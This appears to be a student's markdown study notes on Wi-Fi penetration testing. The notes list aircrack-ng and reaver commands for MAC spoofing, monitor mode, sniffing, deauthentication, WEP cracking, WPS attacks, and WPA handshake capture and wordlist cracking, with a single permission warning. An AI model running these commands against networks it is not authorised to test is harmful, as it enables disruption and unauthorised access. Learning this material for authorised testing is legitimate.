# Ethical Hacking Notes
___

## The Rules

- [x] Don't be a ass.
- [x] Have Fun.
- [ ] Learn Something New.
___

### Changing your device's MAC Address

- First, ensure device is visible with `ifconfig` or `iwconfig`

- Next, take device down with `ifconfig <device name> down`
 
- Next, change the MAC Address with `ifconfig <device name> hw ether <MAC Address>` where MAC Address follow format 00:00:00:00:00:00

- Lastly, bring the device back online with `ifconfig <device name> up`
___

### Change Wirless Adapter to Utilize Monitor Mode

- First, ensure device is visible and not in monitor mode with `iwconfig`

- Next, bring down the device with `ifconfig <device name> down`

- Next, kill off processes that might interfere with aircrack-ng suit by running `airmon-ng check kill`

- Next, update monitor mode by running `iwconfig <device name> mode monitor`

- Lastly, bring the device back online with `ifconfig <device name> up`
___

### Packet Sniffing Using Airodump-ng

- To start packet sniffing, run `airodump-ng <device name>` where device name is your wireless adapter in monitor mode

- To specify the band frequency, utilize the `--band` argument

   `airodump-ng --band abg <device name>` will capture packets over 2.4 and 5 Ghz simultaniously

- In order to sniff packets on a specific network utilize the below command

   `airodump-ng --bssid <router MAC Address> --channel <channel number> --write <write file> <device name>`

___

### Deauthentication Attack with aireplay-ng

- To disconnect any device from any router utilize the command:

   `aireplay-ng --deauth <# of packets> -a <Router MAC> -c <Client MAC> <device name>`

:+1:**DO NOT DO THIS TO A NETWORK OR DEVICE YOU DO NOT OWN OR HAVE PERMISSION TO...**:+1:

___

### Cracking  and Connecting to a WEP Wifi Network

##### High Volume WEP Wifi Network Cracking
- In order to crack a WEP, we need a large ammount of packets from a high volume network.

- Run aircrack-ng with the .cap file to crack the key

   `aircrack-ng <name of .cap file>` 

##### Low Volume WEP Wifi Network Cracking
- Utilize airodump-ng to sniff packets on the victum network as seen above.

- To associate your device to the network utilize aireplay-ng by running the command

   `aireplay-ng --fakeauth 0 -a <Router MAC> -h <Your Device unspec> <device name>` 

- Run an ARP Attack on the network by running the command
   `aireplay-ng --arpreplay -b <Router MAC> -h <Your Device unspec> <device name>`

- Run aircrackpng with the .cap file similar to above to crack the key
___

### Exploiting WPS Feature for WPA/WPA2 Wifi Network

- First, run reaver WPS cracker utilzing the command 

   `reaver --bssid <Network MAC> --channel <channel #> --interface <device name> -vvv --no-associate`

- next, associate your device to the network utilizing above command

___

### Capturing a WPA/WPA2 Handshake

- First, start packet sniffing a specific network utilizing the command
   `airodump-ng --bssid <router MAC Address> --channel <channel number> --write <write file> <device name>`

- Next, run a deauthentication attack on a particular device utilizing the command
   `aireplay-ng --deauth <# of packets> -a <Router MAC> -c <Client MAC> <device name>`

___

### Cracking a WPA/WPA2 handshake with a wordlist Attack

- First, utilize the above section to capture a handshake.

- Next, ensure you have a large word list, github has large common password files

- Lastly, we need to utilize aircrack-ng to try and crack the handshake against the password file
   `aircrack-ng <handshake capture file .cap> -w <password txt file>`
